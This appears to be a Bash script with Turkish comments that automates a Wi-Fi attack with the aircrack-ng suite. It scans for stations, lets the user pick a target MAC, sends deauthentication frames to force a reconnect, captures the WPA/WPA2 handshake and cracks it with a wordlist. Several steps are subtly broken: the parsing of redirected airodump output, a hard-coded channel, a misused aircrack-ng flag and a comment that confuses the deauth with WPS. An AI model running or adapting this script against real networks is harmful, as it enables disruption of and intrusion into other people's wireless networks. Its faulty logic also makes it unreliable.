#!/bin/bash

# Fonksiyon: WiFi cihazlarını tarayarak hedef MAC adresini seçme
function handshake_yakala() {
    # Sistemdeki tüm ağ arayüzlerini listele
    echo "Mevcut ağ arayüzleri:"
    iwconfig | awk '/^[^ ]/ {print $1}'

    # Kullanıcıdan ağ arayüzünü seçin
    read -p "Lütfen ağ arayüzünüzü seçin (örneğin: wlan0): " interface

    # Tarih ve saat bilgisini al
    # timestamp=$(date +"%Y%m%d%H%M%S")
    timestamp=$(date +"%H:%M:%S - %d/%m/%Y")

    # Aircrack-NG'yi kullanarak tüm WiFi cihazlarını tarayın
    echo "Aircrack-NG ile tüm WiFi cihazlarını tarayalım..."
    airmon-ng start $interface
    sudo airodump-ng wlan0mon > wifi_devices_$timestamp.txt

    # Taranan cihazları listele ve kullanıcıya seçim yapmasını isteyin
    echo "Taranan WiFi cihazları:"
    cat wifi_devices_$timestamp.txt | awk '/Station/ {print i++" - "$2}' 

    # Kullanıcıdan seçimi al
    read -p "Lütfen seçmek istediğiniz cihazı girin (örneğin: 1): " choice

    # Seçilen cihazın MAC adresini elde edin
    target_mac=$(cat wifi_devices_$timestamp.txt | awk '/Station/ {print i++" - "$2}' | sed -n "${choice}p" | cut -d' ' -f2)

    # Aircrack-NG'yi kullanarak hedef MAC adresini yakalayın.
    echo "Aircrack-NG ile $target_mac MAC adresini yakalayıp, WPS ile güvenlik test ediyoruz..."

    airmon-ng start $interface  # Monitor moduna geçin
    aireplay-ng --deauth 5 -a $target_mac $interface'mon' # HedefeMAC adresine deauth saldırıları gönderin (WPS için)

    airodump-ng --bssid $target_mac -c 11 -w handshake $interface'mon'

    # WPA/WPA2 handshakes kaydını yakalayın
    aircrack-ng -w wordlist.txt -r handshake-01.cap
}
